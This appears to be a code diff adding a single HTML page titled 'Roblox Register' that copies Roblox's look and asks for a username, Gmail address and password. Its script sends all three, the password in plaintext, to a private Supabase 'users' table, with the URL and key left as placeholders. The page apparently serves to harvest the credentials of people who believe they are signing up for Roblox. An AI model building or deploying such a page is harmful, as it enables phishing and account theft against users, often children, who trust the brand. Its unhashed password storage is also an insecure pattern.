@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Roblox Register</title>
+
+<style>
+body{
+    background:#232527;
+    font-family:Arial;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+}
+
+.box{
+    background:#393b3d;
+    padding:30px;
+    width:300px;
+    border-radius:10px;
+    text-align:center;
+    color:white;
+}
+
+input{
+    width:100%;
+    padding:10px;
+    margin:8px 0;
+    border:none;
+    border-radius:5px;
+}
+
+button{
+    width:100%;
+    padding:10px;
+    background:#00A2FF;
+    color:white;
+    border:none;
+    border-radius:5px;
+    cursor:pointer;
+}
+
+h1{
+    color:white;
+}
+</style>
+</head>
+
+<body>
+
+<div class="box">
+    <h1>ROBLOX</h1>
+
+    <input type="text" id="username" placeholder="Username">
+
+    <input type="email" id="gmail" placeholder="Gmail">
+
+    <input type="password" id="password" placeholder="Password">
+
+    <button onclick="register()">Register</button>
+
+    <p id="msg"></p>
+</div>
+
+<script>
+const SUPABASE_URL = "YOUR_URL";
+const SUPABASE_KEY = "YOUR_KEY";
+
+async function register(){
+
+    let username =
+        document.getElementById("username").value;
+
+    let gmail =
+        document.getElementById("gmail").value;
+
+    let password =
+        document.getElementById("password").value;
+
+    let res = await fetch(
+      SUPABASE_URL + "/rest/v1/users",
+    {
+      method:"POST",
+      headers:{
+        "apikey":SUPABASE_KEY,
+        "Authorization":"Bearer " + SUPABASE_KEY,
+        "Content-Type":"application/json",
+        "Prefer":"return=minimal"
+      },
+      body:JSON.stringify({
+        username,
+        gmail,
+        password
+      })
+    });
+
+    if(res.ok){
+        document.getElementById("msg")
+        .innerHTML="Registered!";
+    }else{
+        document.getElementById("msg")
+        .innerHTML="Error!";
+    }
+}
+</script>
+
+</body>
+</html>
